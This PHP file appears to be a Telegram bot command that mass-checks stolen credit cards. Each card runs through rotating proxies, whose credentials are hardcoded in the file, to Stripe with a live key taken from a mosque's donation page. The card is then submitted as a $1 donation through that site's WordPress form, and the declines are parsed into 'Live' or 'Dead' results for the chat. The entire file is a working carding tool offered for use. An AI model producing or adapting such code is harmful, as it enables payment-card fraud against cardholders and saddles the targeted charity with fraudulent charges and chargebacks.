<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mchk") === 0 || strpos($message, "!mchk") === 0 || strpos($message, ".mchk") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 1;
    if (count($aray) > 5){
  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟱 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$username = "9wrfxdsc2517ipu";
$password = "icse7pfhwom5bqt";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=53babbbd-b2ee-4f2d-96d8-4b34f33fcf02a7f0cd&sid=e8519a2a-15e4-4873-94db-d9baf395df20635077&pasted_fields=number&payment_user_agent=stripe.js%2F646ed0258c%3B+stripe-js-v3%2F646ed0258c%3B+card-element&referrer=https%3A%2F%2Fwww.masjidibraaheem.com&time_on_page=113794&key=pk_live_51P7OxtIVgJkbRDSg63nyhPEv5KLfmGWFwnHOIEUXeEp9YTT3eMnYIn0nT5aFfyA8SMnp0AikeQNJhoEhea1WTnNQ00Vse9NVKA');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$username = "9wrfxdsc2517ipu";
$password = "icse7pfhwom5bqt";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.masjidibraaheem.com/wp-admin/admin-ajax.php?t=1713953796562');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1713953796562 h2',
'Host: www.masjidibraaheem.com',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://www.masjidibraaheem.com',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.masjidibraaheem.com/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D930%26_fluentform_7_fluentformnonce%3D5f71cac6b5%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__entry_intermediate_hash%3D7eb98df9b5dad9ce675955b6bd23fdea%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=7');

$result2a = curl_exec($ch);
$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

curl_close($ch);

if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
      $status = "Live 🟡";
      $response = "Zip Mismatch ❎";
    }


elseif (strpos($result2a, "CVV LIVE")){
  $status = "Live 🟢";
$response = "CVV Matched ✅";
  }
elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
  $status = "CVV Live 🟢";
$response = "INSUFFICIENT FUNDS ✅";

  }
elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, 'security code is incorrect.'))){
  $status = "Live 🟡";
$response = "CCN Live ✅";

  }
elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
  $status = "Live 🟡";
$response = "TRANSACTION NOT ALLOWED";

  }

elseif (strpos($result2a, "DO NOT HONOR")){
  
$status = "Dead 🔴";
$response = "DO NOT HONOR 🚫";
}

elseif (strpos($result2a, "stolen_card")){
  
$status = "Dead 🔴";
$response = "Stolen Card 🚫";
}

elseif (strpos($result2a, "lost_card")){
  $status = "Dead 🔴";
$response = "Lost Card 🚫";
}


elseif (strpos($result2a, "PICKUP CARD")){
  $status = "Dead 🔴";
$response = "PICKUP CARD";
}


elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
  
  $status = "Dead 🔴";
$response = "Incorrect Card Number 🚫";
}


elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
  $status = "Dead 🔴";
$response = "Expired Card 🚫";

  }


elseif (strpos($result2a, 'Jazakumullahu Khairan for your donation!')){
  $status = "Live 🟢";
$response = "CCN 1$ ✅";

  }


elseif (strpos($result2a, "FRAUDULENT")){
  $status = "Dead 🔴";
$response = "Fraudulent 🚫";
}


elseif (strpos($result2a, "lock_timeout")){
  $status = "Dead 🔴";
$response = "error 404 🚫";
}


elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
  $status = "Dead 🔴";
$response = "Generic Decline 🚫";
}


elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
  $status = "Dead 🔴";
$response = "NVAILD EXPIRY MONTH 😥";
}



elseif (strpos($result2a, "Error processing payment")){
  $status = "Dead 🔴";
$response = "Error processing payment";
}

elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
  $status = "Live 🟡";
$response = "CARD NOT SUPPORTED 🚫";
}


elseif (strpos($result2a, "parameter_invalid_empty")){
  $status = "Dead 🔴";
$response = "404 error 🚫";
}

else {
      $status = "Dead 🔴";
$response = "Payment Error 🚫";

    }
//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  MASS STRIPE AUTH 3$  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
